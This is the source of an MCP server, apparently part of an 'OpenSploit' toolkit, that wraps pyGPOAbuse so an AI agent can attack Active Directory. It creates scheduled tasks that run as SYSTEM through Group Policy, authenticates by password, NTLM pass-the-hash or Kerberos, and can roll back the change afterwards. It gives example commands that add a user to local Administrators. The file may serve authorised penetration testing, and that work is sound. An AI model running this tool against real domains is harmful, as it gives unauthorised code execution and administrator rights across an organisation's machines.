#!/usr/bin/env python3
"""
OpenSploit MCP Server: pygpoabuse

Active Directory GPO exploitation — create scheduled tasks, add local admins,
or add startup scripts via Group Policy Object abuse.
"""

import asyncio
import re
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output

PYGPOABUSE_PATH = "/opt/pygpoabuse/pygpoabuse.py"


class PygpoabuseServer(BaseMCPServer):
    """MCP server wrapping pyGPOAbuse for AD GPO exploitation."""

    def __init__(self):
        super().__init__(
            name="pygpoabuse",
            description="Active Directory GPO exploitation — scheduled tasks, local admin, startup scripts via GPO abuse",
            version="1.0.0",
        )

        _common_params = {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target in domain/username[:password] format (e.g., 'TEIGNTON/jay.teignton:password123')",
            },
            "gpo_id": {
                "type": "string",
                "description": "GPO GUID to target (e.g., '31B2F340-016D-11D2-945F-00C04FB984F9'). Provide either gpo_id or gpo_name.",
            },
            "gpo_name": {
                "type": "string",
                "description": "GPO display name to target (resolved via LDAP). Provide either gpo_id or gpo_name.",
            },
            "dc_ip": {
                "type": "string",
                "description": "Domain controller IP address",
            },
            "hash": {
                "type": "string",
                "description": "NTLM hash in LMHASH:NTHASH format (pass-the-hash)",
            },
            "kerberos": {
                "type": "boolean",
                "default": False,
                "description": "Use Kerberos authentication (requires ccache file)",
            },
            "ldaps": {
                "type": "boolean",
                "default": False,
                "description": "Use LDAPS instead of LDAP",
            },
        }

        self.register_method(
            name="scheduled_task",
            description="Create an immediate scheduled task as SYSTEM via GPO",
            params={
                **_common_params,
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command to execute (e.g., 'net localgroup Administrators jay /add', 'cmd /c whoami > C:\\proof.txt')",
                },
                "taskname": {
                    "type": "string",
                    "description": "Custom task name (default: TASK_<random>)",
                },
                "user_gpo": {
                    "type": "boolean",
                    "default": False,
                    "description": "Target user GPO instead of computer GPO",
                },
                "powershell": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use PowerShell for command execution",
                },
                "force": {
                    "type": "boolean",
                    "default": False,
                    "description": "Force add the scheduled task even if one exists",
                },
            },
            handler=self.scheduled_task,
        )

        self.register_method(
            name="cleanup",
            description="Remove a previously created scheduled task and roll back GPO version",
            params={
                **_common_params,
                "taskname": {
                    "type": "string",
                    "required": True,
                    "description": "Name of the task to remove",
                },
            },
            handler=self.cleanup,
        )

    def _build_cmd(
        self,
        target: str,
        gpo_id: str = None,
        gpo_name: str = None,
        dc_ip: str = None,
        hash: str = None,
        kerberos: bool = False,
        ldaps: bool = False,
        extra_args: list = None,
    ) -> List[str]:
        """Build pyGPOAbuse command."""
        cmd = ["python3", PYGPOABUSE_PATH, target]

        if gpo_id:
            cmd.extend(["-gpo-id", gpo_id])
        elif gpo_name:
            cmd.extend(["-gpo-name", gpo_name])
        else:
            return None  # Must provide one

        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        if hash:
            cmd.extend(["-hashes", hash])
        if kerberos:
            cmd.append("-k")
        if ldaps:
            cmd.append("-ldaps")

        if extra_args:
            cmd.extend(extra_args)

        return cmd

    async def scheduled_task(
        self,
        target: str,
        command: str,
        gpo_id: str = None,
        gpo_name: str = None,
        dc_ip: str = None,
        hash: str = None,
        kerberos: bool = False,
        ldaps: bool = False,
        taskname: str = None,
        user_gpo: bool = False,
        powershell: bool = False,
        force: bool = False,
    ) -> ToolResult:
        """Create an immediate scheduled task as SYSTEM via GPO."""
        self.logger.info(f"GPO scheduled task: target={target} command={command}")

        if not gpo_id and not gpo_name:
            return ToolResult(
                success=False, data={},
                error="Must provide either gpo_id or gpo_name",
            )

        extra_args = ["-command", command]
        if taskname:
            extra_args.extend(["-taskname", taskname])
        if user_gpo:
            extra_args.append("-user")
        if powershell:
            extra_args.append("-powershell")
        if force:
            extra_args.append("-f")

        cmd = self._build_cmd(target, gpo_id, gpo_name, dc_ip, hash, kerberos, ldaps, extra_args)
        if not cmd:
            return ToolResult(success=False, data={}, error="Must provide either gpo_id or gpo_name")

        try:
            result = await self.run_command(cmd, timeout=60)
            stdout = result.stdout.strip() if result.stdout else ""
            stderr = result.stderr.strip() if result.stderr else ""
            combined = f"{stdout}\n{stderr}".strip()

            # Detect failure indicators in output
            failure_indicators = [
                "unable to connect", "does not exist", "access denied",
                "error", "failed", "domain should be specified",
            ]
            has_failure = any(ind in combined.lower() for ind in failure_indicators)
            has_success = "task was created" in combined.lower() or "success" in combined.lower()

            # Success only if positive indicator present AND no failure indicators
            success = has_success and not has_failure
            # Or if no failure indicators and returncode is 0 and we got some output
            if not has_success and not has_failure and result.returncode == 0 and len(combined) > 10:
                success = True

            return ToolResult(
                success=success,
                data={
                    "target": target,
                    "gpo": gpo_id or gpo_name,
                    "command": command,
                    "taskname": taskname,
                },
                raw_output=sanitize_output(combined, max_length=5000),
                error=None if success else f"GPO task creation failed — check raw output",
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"GPO scheduled task failed: {e}")

    async def cleanup(
        self,
        target: str,
        taskname: str,
        gpo_id: str = None,
        gpo_name: str = None,
        dc_ip: str = None,
        hash: str = None,
        kerberos: bool = False,
        ldaps: bool = False,
    ) -> ToolResult:
        """Remove a scheduled task and roll back GPO version."""
        self.logger.info(f"GPO cleanup: target={target} taskname={taskname}")

        if not gpo_id and not gpo_name:
            return ToolResult(success=False, data={}, error="Must provide either gpo_id or gpo_name")

        extra_args = ["-taskname", taskname, "--cleanup"]

        cmd = self._build_cmd(target, gpo_id, gpo_name, dc_ip, hash, kerberos, ldaps, extra_args)

        try:
            result = await self.run_command(cmd, timeout=30)
            stdout = result.stdout.strip() if result.stdout else ""
            stderr = result.stderr.strip() if result.stderr else ""
            combined = f"{stdout}\n{stderr}".strip()

            # Detect failure
            failure_indicators = [
                "unable to connect", "access denied", "error while cleaning",
                "does not exist", "failed", "domain should be specified",
            ]
            has_failure = any(ind in combined.lower() for ind in failure_indicators)

            return ToolResult(
                success=not has_failure,
                data={
                    "target": target,
                    "taskname": taskname,
                    "cleaned_up": not has_failure,
                },
                raw_output=sanitize_output(combined, max_length=5000),
                error=f"GPO cleanup failed — check raw output" if has_failure else None,
            )

        except Exception as e:
            return ToolResult(success=False, data={}, error=f"GPO cleanup failed: {e}")


if __name__ == "__main__":
    PygpoabuseServer.main()
